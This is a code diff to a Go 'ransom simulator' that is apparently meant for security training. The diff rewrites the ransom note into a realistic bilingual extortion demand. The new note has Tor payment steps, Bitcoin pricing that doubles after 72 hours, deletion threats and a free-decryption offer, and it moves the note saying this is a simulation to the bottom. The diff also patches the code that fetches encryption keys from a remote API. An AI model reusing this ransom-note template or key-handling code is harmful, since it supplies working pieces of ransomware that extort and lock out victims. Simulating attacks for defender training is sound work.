@@ -47,20 +47,82 @@ tQIDAQAB
 
 // --- 勒索信内容 ---
 const ransomNoteContent = `
-========================= [ 你的所有文件都已被锁定! ] =========================
+================================================================================
+   !!! ATTENTION: YOUR FILES ARE ENCRYPTED / 注意：您的文件已被加密 !!!
+================================================================================
 
-不要惊慌！这是一个受控的模拟演练。但如果这是一次真实的攻击，
-你的网络已经被完全攻陷。
+[ WARNING: Read the following carefully, or you may lose your data permanently ]
+[ 警告：请仔细阅读以下内容，否则您可能永久丢失数据 ]
 
-Your unique ID: %s
+--------------------------------------------------------------------------------
+ENGLISH version
+--------------------------------------------------------------------------------
 
-本程序不会对加密的原文件进行删除操作，如遇原文件丢失，可通过下方链接获取私钥：
+Q: What happened?
+A: Your computers and servers have been locked by our security software. All your important files (including documents, photos, databases, SQL, backups, etc.) have been encrypted with strong algorithms. It is technically impossible to decrypt them without the private key held by us.
 
-https://encrypt.yangzifun.org/
+Attempts to modify or rename encrypted files may result in permanent data corruption.
 
-你的专属ID是: %s
+Q: How to restore my files?
+A: The only way to restore files is to purchase the decryption tool and private key from us.
+
+1. Download and install Tor Browser (https://www.torproject.org/).
+2. Visit our recovery page: [onion_address_placeholder]
+3. Enter your unique Personal ID: %s
+
+Payment Terms:
+You must pay the ransom in Bitcoin. The price depends on how quickly you contact us.
+- If you contact us within 72 hours, the price is: $X,XXX USD (BTC equivalent).
+- If over 72 hours, the price will double.
+- If we do not receive payment within 7 days, your decryption key will be deleted, and data will be lost permanently.
+
+Free Decryption Test:
+To prove that we can recover your files, you can send us 2 small non-important files (less than 1MB), and we will decrypt them for free.
+
+Do not attempt to decrypt it yourself or use third-party software; this will cause permanent data loss.
+
+--------------------------------------------------------------------------------
+中文版本 (Chinese Version)
+--------------------------------------------------------------------------------
+
+问：发生了什么？
+答：您的计算机和服务器已被我们的安全软件锁定。您所有的重要文件（包括文档、照片、数据库、SQL、备份等）都已被高强度算法加密。如果不使用我们持有的私钥，这在技术上是无法解密的。
+
+试图修改或重命名加密文件可能会导致数据永久损坏。
+
+问：如何恢复我的文件？
+答：恢复文件的唯一方法是从我们这里购买解密工具和私钥。
+
+1. 下载并安装 Tor 浏览器 (https://www.torproject.org/).
+2. 访问我们的恢复页面: [此处为模拟的 .onion 地址]
+3. 输入您的唯一个人ID: %s
+
+付款条款：
+您必须以比特币（Bitcoin）支付赎金。
+价格取决于您与其联系的速度。
+- 如果在 72 小时内联系我们，价格为：$X,XXX USD (BTC 等值)
+- 如果超过 72 小时，价格将翻倍。
+- 如果我们在 7 天内没有收到付款，您的解密密钥将被删除，数据将永久丢失。
+
+免费解密测试：
+为了证明我们可以恢复您的文件，您可以发送 2 个非重要的小文件（小于 1MB）给我们，我们将免费为您解密。
+
+切勿尝试自行解密或使用第三方软件，这会导致数据永久丢失。
+
+[攻击者组织名称/签名]
 
 ====================== [ 这是一次用于安全培训的模拟 ] ======================
+
+不要惊慌！这是一个受控的模拟演练。但如果这是一次真实的攻击，你的网络已经被完全攻陷。
+本程序不会对加密的原文件进行删除操作，如遇原文件丢失，可通过下方链接获取私钥及解密程序：
+https://encrypt.yangzifun.org/
+获取私钥ID是: %s
+
+项目链接：https://github.com/yangzifun/ransom_simulator
+免责声明与许可
+本项目遵循 MIT 许可证请查阅 LICENSE 文件了解详情。
+再次强调，此工具的创建旨在赋能**防御者**，而非赋能攻击者。请在法律和道德允许的范围内负责任地使用。
+
 `
 
 var (
@@ -470,37 +532,40 @@ func runEncryptionWorkers(files []string, numWorkers int, stats *counters, outUU
 }
 
 func fetchKeysFromAPI() (*APIResponse, error) {
-	client := &http.Client{Timeout: 5 * time.Second}
-	req, err := http.NewRequest("POST", apiURL, nil)
+	// 修复点 1: 创建一个空的 JSON Body "{}"
+	// 服务器可能无法接受 POST 请求的 Body 为 nil
+	jsonBody := []byte("{}")
+	req, err := http.NewRequest("POST", apiURL, bytes.NewBuffer(jsonBody))
 	if err != nil {
 		return nil, fmt.Errorf("创建请求失败: %w", err)
 	}
+	// 保持原有的 User-Agent
 	req.Header.Set("User-Agent", "Ransom-Simulator/"+version)
 
+	// 修复点 2: 显式设置 Content-Type 防止 412/415 错误
+	req.Header.Set("Content-Type", "application/json")
+	client := &http.Client{Timeout: 5 * time.Second}
 	res, err := client.Do(req)
 	if err != nil {
 		return nil, fmt.Errorf("请求API失败: %w", err)
 	}
 	defer func() { _ = res.Body.Close() }()
-
 	if res.StatusCode != http.StatusOK {
-		return nil, fmt.Errorf("API返回非200状态码: %d", res.StatusCode)
+		// 增加调试信息，如果还报错可以看到具体原因
+		body, _ := io.ReadAll(res.Body)
+		return nil, fmt.Errorf("API返回异常状态码: %d, Body: %s", res.StatusCode, string(body))
 	}
-
 	body, err := io.ReadAll(res.Body)
 	if err != nil {
 		return nil, fmt.Errorf("读取响应体失败: %w", err)
 	}
-
 	var apiResp APIResponse
 	if err := json.Unmarshal(body, &apiResp); err != nil {
 		return nil, fmt.Errorf("解析JSON失败: %w", err)
 	}
-
 	if apiResp.UUID == "" || apiResp.PublicKeyPEM == "" {
 		return nil, fmt.Errorf("API响应无效，缺少UUID或公钥")
 	}
-
 	return &apiResp, nil
 }
 
